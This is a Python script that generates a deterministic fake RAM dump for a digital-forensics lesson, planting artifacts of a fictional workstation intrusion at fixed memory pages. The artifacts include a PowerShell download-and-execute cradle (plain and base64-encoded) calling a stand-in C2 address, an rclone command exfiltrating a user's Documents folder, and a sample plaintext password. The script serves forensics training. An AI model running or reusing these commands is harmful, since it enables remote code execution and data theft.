#!/usr/bin/env python3
"""mk_mem_sample.py - build a small, realistic raw memory sample for the Day 23 labs.

Usage: python3 mk_mem_sample.py OUT [--size-mib N]

A real RAM capture from WinPmem/Magnet/Belkasoft is a multi-gigabyte raw image whose contents
change second to second, so it can't be shipped or reproduced. This builds a compact, deterministic
stand-in (default 16 MiB) that is *byte-identical on every run* and laid out like physical memory —
4 KiB pages, mostly zero (as real RAM largely is), with forensically meaningful artifacts placed at
known pages so the triage workflow in the lesson is reproducible. The content follows the WS-ALICE
intrusion (Days 9 to 22): a PowerShell download cradle, an rclone exfil command, the 203.0.113.50
C2, a leaked credential, an environment block, and one high-entropy page standing in for an
encrypted payload. It is NOT a real OS memory image (no page tables, no _EPROCESS list) - Volatility
in Day 24 needs a real capture; today is about acquisition and the first-pass triage that works on
any raw dump. Standard library only.

The sample deliberately stores most Windows strings as UTF-16LE, the way Windows holds them, so the
lesson can show that a plain ASCII `strings` misses them and `strings -e l` is required.
"""
import argparse
import base64
import hashlib
import struct
import sys

PAGE = 4096


def utf16(s):
    return s.encode("utf-16-le")


def enc_command(ps):
    """Windows 'powershell -enc' base64: the command encoded as UTF-16LE then base64."""
    return base64.b64encode(ps.encode("utf-16-le")).decode("ascii")


def entropy_page(tag):
    """A deterministic 4 KiB page of high-entropy bytes (a counter run through SHA-256)."""
    out = bytearray()
    counter = 0
    while len(out) < PAGE:
        out += hashlib.sha256(tag + struct.pack("<I", counter)).digest()
        counter += 1
    return bytes(out[:PAGE])


# The PowerShell the attacker ran, and its -enc form (the encoded blob is what you first see in RAM)
CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')"
ENV_BLOCK = "\x00".join([
    "COMPUTERNAME=WS-ALICE", "USERNAME=alice", "USERDOMAIN=WS-ALICE",
    "SystemRoot=C:\\Windows", "TEMP=C:\\Users\\alice\\AppData\\Local\\Temp",
    "LOGONSERVER=\\\\WS-ALICE", "NUMBER_OF_PROCESSORS=4"]) + "\x00\x00"

# (page index, raw bytes) - artifacts sit at page boundaries; the strings inside do not have to
ARTIFACTS = [
    # ASCII: a process command line as it might appear in a console host / command-line buffer
    (100, b"cmd.exe /c powershell.exe -nop -w hidden -enc " + enc_command(CRADLE).encode() + b"\x00"),
    # ASCII: the decoded script block (AMSI / ScriptBlock buffers keep the cleartext)
    (101, b"ScriptBlock: " + CRADLE.encode() + b"\x00"),
    # UTF-16LE: the rclone exfil command line (Windows keeps most strings as wide chars)
    (200, utf16(r"C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy "
                r"C:\Users\alice\Documents remote:drop --config C:\Users\alice\AppData\Local\Temp\rc\rc.conf") + b"\x00\x00"),
    # UTF-16LE: a UNC path to the C2 share and the service name left by PsExec
    (201, utf16(r"\\203.0.113.50\drop") + b"\x00\x00" + utf16("PSEXESVC") + b"\x00\x00"),
    # ASCII: a leaked plaintext credential (as a logon prompt / lsass buffer might hold)
    (300, b"User: alice\nPassword: Autumn2026!\nDefaultPassword=Autumn2026!\x00"),
    # a NUL-separated environment block, as the PEB holds it (UTF-16LE)
    (301, utf16(ENV_BLOCK)),
    # ASCII: a network connection line, the kind a netstat buffer leaves behind
    (400, b"TCP    10.20.30.40:50122    203.0.113.50:443    ESTABLISHED    4820 rclone.exe\x00"),
    # a high-entropy page: an encrypted/packed payload staged in memory
    (777, entropy_page(b"ws-alice-stage2")),
]


def main(out, size_mib):
    size = size_mib * 1024 * 1024
    buf = bytearray(size)
    for page, data in ARTIFACTS:
        off = page * PAGE
        if off + len(data) > size:
            sys.exit(f"artifact at page {page} does not fit in a {size_mib} MiB image")
        buf[off:off + len(data)] = data
    with open(out, "wb") as f:
        f.write(buf)
    digest = hashlib.sha256(buf).hexdigest()
    print(f"wrote {out}: {size} bytes ({size // PAGE} pages of {PAGE}), {len(ARTIFACTS)} artifact pages")
    print(f"sha256: {digest}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("out")
    ap.add_argument("--size-mib", type=int, default=16)
    a = ap.parse_args()
    main(a.out, a.size_mib)
